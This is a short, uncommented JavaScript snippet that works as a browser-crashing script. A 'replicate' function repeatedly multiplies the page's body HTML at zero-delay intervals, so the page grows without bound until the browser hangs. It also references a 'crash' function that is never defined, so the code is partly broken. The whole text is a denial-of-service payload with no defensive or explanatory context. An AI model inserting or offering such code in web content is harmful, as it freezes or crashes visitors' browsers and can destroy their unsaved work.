function replicate() {
  document.body.innerHTML += 
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML +
    document.body.innerHTML;
  setInterval(crash, 0);
}

setInterval(replicate, 0);
